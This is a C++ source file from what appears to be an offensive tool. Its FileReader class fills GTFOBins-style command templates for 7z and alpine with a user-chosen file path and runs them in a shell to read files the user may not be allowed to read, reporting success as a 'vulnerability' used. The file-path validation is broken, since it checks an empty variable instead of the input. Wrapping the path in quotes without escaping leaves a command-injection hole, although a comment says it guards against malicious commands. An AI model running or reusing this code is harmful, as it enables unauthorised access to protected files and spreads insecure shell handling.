//
// Created by moshe on 16/10/2023.
//


#include <iostream>
#include <filesystem>

#include "../../Header/Exploits/FileReader.h"
#include "../../../Logger/Header/Logger.h"


FileReader::FileReader(const ShellCommander& shellCommander) : _shellCommander(shellCommander)
{
    //TODO: Read the commands from the DB or other config file
    //TODO: Load all the commands from the web
    _templateCommands[0] = "LFILE={0}\n7z a -ttar -an -so $LFILE | 7z e -ttar -si -so";
    _templateCommands[1] = "LFILE={0}\nalpine -F \"$LFILE\"";
}

bool FileReader::isFileExists(const std::string& filePath)
{
    //TODO: Check that the
    // 1) filePath variable contains only a path and doesn't contain anything else (like commands, flags, args etc.)
    // 2) filePath content surround with the char Apostrophes (")
    // 3) The path is absolut path and no relative because the relative influenced by the software running folder place
    //
    //TODO: Add try catch in all functions!

    std::ifstream actualFilesystem(filePath);
    std::filesystem::path path(filePath);

    if(!actualFilesystem){
        logger->Error("The given path is not an exist file path");
        return false;
    }

    if(!path.is_absolute()){
        logger->Error("The given path is not an absolute file path");
        return false;
    }

    if(std::filesystem::is_directory(filePath)) {
        logger->Error("The given path is a folder path but needed FILE path");
        return false;
    }

    return true;
}

void surroundWithQuotes(std::string& input) {
    // Check if the string starts with a double quote
    if (!input.empty() && input.front() != '\"') {
        input = "\"" + input;
    }

    // Check if the string ends with a double quote
    if (!input.empty() && input.back() != '\"') {
        input = input + "\"";
    }
}

const std::string FileReader::createFailedCommandMsg(const std::string& fullCommand, const RunningResult& runingResult) {
    std::string failedCommandMsg;
    failedCommandMsg = "Try the command:\n" + fullCommand + "\nThe command failed with exit code " +
                     std::to_string(runingResult.ExitCode) + ".\n The verbose is: " + runingResult.Verbose;
    if(!runingResult.AdditionalInfo.empty()){
        failedCommandMsg += ".\nThe additional info is: " + runingResult.AdditionalInfo;
    }

    return failedCommandMsg;
}

void FileReader::getFilePath(std::string& filePath) {

    std::string input;
    std::cout << "Please enter a file path that you want to read: " << std::endl;
    getline(std::cin, input);

    //Validate that the filePath pointer is not null, and it's point to the existing READABLE file
    while(!isFileExists(filePath)) {
        std::cout << "File path that you entered is NOT a valid file path!";
        getline(std::cin, input);
    }

    filePath = input;
}

// Left const for the value in the location of the pointer. The right const protects the pointer-location itself
int FileReader::run(size_t argc, const std::string argv[])
{
    std::string filePath;
    getFilePath(filePath);

    //Add quotes in order to prevent unexpected behavior
    //and to handle malicious command in the file path
    surroundWithQuotes(filePath);

    bool search1vuln = getSearchingOption();

    for(const std::string& _templateCommand : _templateCommands){

        std::string fullCommand;

        try{
            fullCommand = fillCmdTemplate(filePath, _templateCommand);
        }catch (std::exception& e) {
            logger->Error("Exception was thrown during running the command: " +
                _templateCommand + "\nThe Exception message is: " + e.what());
            continue;
        }

        // Print the modified string
        std::string startRunningMsg = "The fullCommand with file path is:\n" + fullCommand;

        logger->Info(startRunningMsg);

        //TODO: add try catch here. because this function throws a string
        //TODO: If you write the output to the stream, then in the case of searching for more vulnerabilities,
        //      you have to change the stream for each and every vulnerability
        RunningResult runningResult = _shellCommander.run(fullCommand);
        if(runningResult.ExitCode != 0){
            std::string failedCommandMsg = createFailedCommandMsg(fullCommand, runningResult);

            logger->Error(failedCommandMsg);

            continue;
        }

        std::string successCommandMsg = createSuccessCommandMsg(fullCommand, runningResult);

        std::cout << successCommandMsg << std::endl;
        logger->Info(successCommandMsg);

        if(search1vuln) { break; }
    }

    return EXIT_SUCCESS;
}

const std::string FileReader::createSuccessCommandMsg(const std::string& fullCommand,
                                                      const RunningResult& runingResult) {
    std::string successCommandMsg = "Congratulations! we managed to use one of the vulnerabilities.\nThe command is: "
            + fullCommand + ".\n The verbose is: " + runingResult.Verbose;
    if(!runingResult.AdditionalInfo.empty()){
        successCommandMsg += ".\nThe additional info is: " + runingResult.AdditionalInfo;
    }

    return successCommandMsg;
}

bool FileReader::getSearchingOption() {
    std::cout << "Choose one of the following options:" <<
              "\n1) Return the first vulnerability found." <<
              "\n2) Continue to find all the vulnerabilities you can." <<
              "\nYour choice is: ";

    char choose;
    std::cin >> choose;
    while(choose != '1' && choose != '2'){
        std::cout << "Please enter a number in the range 1-2" << std::endl;
        std::cin >> choose;
    }

    bool search1vuln = choose == '1';
    return search1vuln;
}
